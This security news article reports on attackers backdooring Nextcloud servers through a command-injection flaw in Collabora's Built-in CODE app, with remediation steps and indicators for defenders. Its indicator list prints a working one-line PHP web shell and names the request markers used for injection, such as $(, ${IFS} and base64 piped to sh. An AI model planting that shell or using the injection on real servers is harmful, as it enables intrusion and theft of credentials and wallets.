---
ai_commentary: []
ai_commentary_meta:
  content_digest: ''
  generated_at: ''
  model: ''
  prompt_version: ''
  provider: ''
category: ai-security
date: '2026-10-15T04:02:37.285316+00:00'
exported_at: '2026-10-15T04:02:39.867491+00:00'
feed: https://feeds.feedburner.com/TheHackersNews
language: en
source_url: https://thehackernews.com/2026/10/hackers-backdoor-nextcloud-servers.html
structured_data:
  about: []
  author: ''
  description: Attackers planted web shells through Collabora's Built-in CODE app
    while its document server was down; versions before 26.4.303 are affected.
  headline: Hackers Backdoor Nextcloud Servers Through Critical Flaw in Collabora’s
    Built-in CODE App
  inLanguage: en
  keywords: []
  main_image: ''
  original_source: https://thehackernews.com/2026/10/hackers-backdoor-nextcloud-servers.html
  publisher:
    logo: /favicon.ico
    name: GTCode
title: Hackers Backdoor Nextcloud Servers Through Critical Flaw in Collabora’s Built-in
  CODE App
updated_at: '2026-10-15T04:02:37.285316+00:00'
url_hash: 639d0d6e00a7eca3d11d5db60af7d3290bccdcaa
---

Attackers exploited a flaw in an optional Nextcloud app,
[Collabora Online - Built-in CODE Server](https://apps.nextcloud.com/apps/richdocumentscode)
, to plant web shells on Nextcloud servers. Three administrators
[reported the issue on GitHub](https://github.com/CollaboraOnline/richdocumentscode/issues/354)
, with the first logged attack on September 10.

A web shell is a small file that executes any command an attacker sends via a web request, with the rights of the web server account. The flaw allows an unauthenticated request to run a command on the server, but only when the app's local document server is not running, such as during a restart or upgrade, or after a crash.

Collabora fixed it in
[version 26.4.303](https://github.com/CollaboraOnline/richdocumentscode/releases/tag/26.4.303)
on September 11 and on October 14 published
[an advisory](https://github.com/CollaboraOnline/online/security/advisories/GHSA-g3vx-3m76-fghh)
with the identifier
[CVE-2026-110447](https://www.cve.org/CVERecord?id=CVE-2026-110447)
, warning that turning off the app does not help: it must be updated or removed.

### Who Is Affected

The app, published by Collabora under the package name richdocumentscode, downloads a copy of Collabora Online Development Edition (CODE) and runs it on the Nextcloud server itself.

That lets Nextcloud Office edit documents without a separate Collabora server. Its store listing says it is "for local testing and non-production use" and "for personal use or for small teams."

Collabora's advisory covers every version before 26.4.303 and says standalone Collabora Online servers are not affected. A
[warning posted on the Nextcloud community forum](https://help.nextcloud.com/t/to-collabora-built-in-user-update-asap/250516)
on October 3 stated that an installation is not affected if it uses only the Nextcloud Office app ( richdocuments) without the built-in app, whether its Collabora server runs in Docker, from a Linux package, or at a hosting provider.

The app's proxy.php script starts the local CODE server whenever a request arrives, and nothing is listening. In versions up to 26.4.302, the script placed text from the request, including its path, inside a double-quoted bash command, where the shell still runs anything written as $(...).

A request with a command hidden in its path ran that command as the web server user. Because the script only builds that command when it needs to start the server, the attack works only while the server is down, such as during a container restart, an upgrade, or a crash.

The script is a plain PHP file that the web server runs directly from the app's folder and loads none of Nextcloud's code.

"It is not sufficient to disable the app to avoid the problem; it must be upgraded to &gt;= 26.4.303 or removed," Collabora said in the advisory.

The fixed versions
[require Nextcloud 30 or later](https://apps.nextcloud.com/apps/richdocumentscode/releases?platform=26)
.

Nextcloud 29 and older are end of life, and the app store still serves them an affected version, so their users should upgrade Nextcloud or remove the app. Collabora's fix for a separate command-injection flaw in the same script,
[CVE-2025-66208](https://github.com/CollaboraOnline/online/security/advisories/GHSA-j3q6-q5pc-v5wf)
, disclosed last December, does not prevent this one.

### What the Attackers Did

The first report came from an administrator who hosts several Nextcloud servers and wrote on GitHub that the servers had been hacked since the day before. Access logs from two of them show requests at 19:51 on September 10 and 09:56 on September 11 (UTC+2), both from one IP address and both aimed at proxy.php?status with a shell command hidden in the request path. All of the administrator's servers ran version 26.4.302.

The command decoded a one-line PHP web shell into the app's folder and tried to send the server's uname -a output to a webhook.site address. On one server, the attacker then used the shell to search for credential stores and cryptocurrency wallets, including \*.kdbx, wallet.dat and keystore.json files and names such as bitwarden, 1password, .bitcoin, .electrum, .monero and .ethereum.

The reviewed requests showed no commands that archived, uploaded, or copied out files, but anything the web server account can read must be treated as potentially exposed, the administrator wrote.

Two other administrators reported the same on their own instances. One found the shell when Nextcloud's integrity check flagged a new PHP file, and the other learned of the break-in from emails about failed sudo attempts on the server. None of the reports show the attacker gaining root access.

After updating to 26.4.303, one of them logged another attempt on September 14 from a second IP address with a payload of the same kind. The CODE server it started carried the attack text in its startup options, but no new shell file appeared. The output "looks scary but should be harmless," replied mmeeks, who answered for the project in the thread, telling users to update and to remove any leftover shx\*.php files.

The CVE record describes the flaw as "exploited in the wild in September and October 2026." How many servers were hit is not known. "This impacts only the Development Edition, and only in this (rather rarer) Built-in CODE Server deployment mode that downloads a local appimage," mmeeks wrote.

### What to Do Now

What to do, in order:

1. Update
   `richdocumentscode`
   , which appears in Nextcloud's app list as Collabora Online - Built-in CODE Server, to 26.4.303 or later, or remove the app. Disabling it in Nextcloud does not close the flaw.
2. On Nextcloud 29 or older, which cannot install 26.4.303, upgrade Nextcloud or remove the app.
3. If you already updated, look for
   `shx*.php`
   files, starting in
   `apps/richdocumentscode`
   , and delete them. Then check your access logs back to at least September 10 for
   `proxy.php?status`
   requests whose path contains
   `%2e%2e`
   ,
   `$(`
   or
   `${IFS}`
   , and look for
   `sudo`
   attempts by the web server account. Treat anything that account could read as potentially exposed, as the first reporter advised.
4. Version 26.4.402, released September 24, rewrote the start command to pass each option as a separate argument, but administrators report that it
   [fails to start](https://github.com/CollaboraOnline/richdocumentscode/issues/356)
   or
   [fails to open documents](https://github.com/CollaboraOnline/richdocumentscode/issues/355)
   on some setups and have gone back to 26.4.303, the version the advisory names as the fix. No newer release had appeared as of October 14.

Indicators from the administrators' logs:

* **File**
  :
  `shrf4645.php`
  ,
  `shxa35d0.php`
  ,
  `shx5cf91.php`
  ,
  `shxd33ce.php`
  and
  `shxf4645.php`
  , found in
  `apps/richdocumentscode/`
  on the first reporter's servers
* **File**
  :
  `shx13a86.php`
  , found by a second administrator (location not stated)
* **File**
  :
  `shx56367.php`
  , the name in the September 14 attempt that created no file
* **SHA-256**
  :
  `4b9fbd0663fbfd6028fc216ed18e0d6ef3ae498a7fdc97083e4b0ce3cec40562`
  , the one-line shell
  `&lt;?php $c=$_GET['c']??'id'; echo shell_exec($c.' 2&gt;&amp;1');`
* **Path**
  :
  `/apps/richdocumentscode/proxy.php?status`
* **IP**
  :
  `139.28[.]18[.]122`
  (September 10 and 11 attacks),
  `89.38[.]98[.]50`
  (September 14 attempt against a patched server)
* **Request markers**
  :
  `%2e%2e`
  ,
  `$(`
  ,
  `${IFS}`
  , and
  `base64 -d`
  piped to
  `sh`
  , all in the request path
* **Domain**
  :
  `webhook[.]site`
  , a public service, with callback IDs
  `45060ed4-de0b-4119-8f0d-2a2776bbd413`
  and
  `774cf5e1-b5a4-4174-a1ad-0241861029a2`

### A Fix That Shipped Without a Security Notice

The code change that closed the flaw is
[four lines](https://github.com/CollaboraOnline/richdocumentscode/commit/6cc8dae54c92bae27d53c54b9898cf1123ca2066)
in
`proxy.php`
. The start command is now handed to bash as a single escaped argument instead of a double-quoted string, so the shell that receives it no longer expands text from the request.

The repository's commit record shows the change was written on August 20 by Caolán McNamara, who also published the advisory, under the title "tidy up how the coolwsd launch command is built." It was not in version 26.4.302, released on August 31, and was committed on September 9. The first logged attack came on September 10, and 26.4.303 followed on September 11 with release notes that name only the bundled CODE build.

The administrator who reported the attacks disabled the app while waiting for a fix, the step the advisory now says is not enough. In the thread, mmeeks told users to update, promised "more updates in due course," and pointed to a "record backlog" at GitHub's advisory database, linking to
[a June post](https://github.blog/security/supply-chain-security/inside-the-advisory-database-and-what-happens-when-vulnerability-volume-breaks-records/)
in which GitHub said its processing had fallen weeks behind.

On October 3, a member of the Nextcloud community forum warned other users to update at once because the flaw was "already being exploited" and "no warning or CVE has been published." The CVE and the advisory came on October 14. The advisory credits a GitHub user, wwwshellcodeit, as the reporter, and neither it nor the thread says when the report came or when Collabora learned the change was a security fix.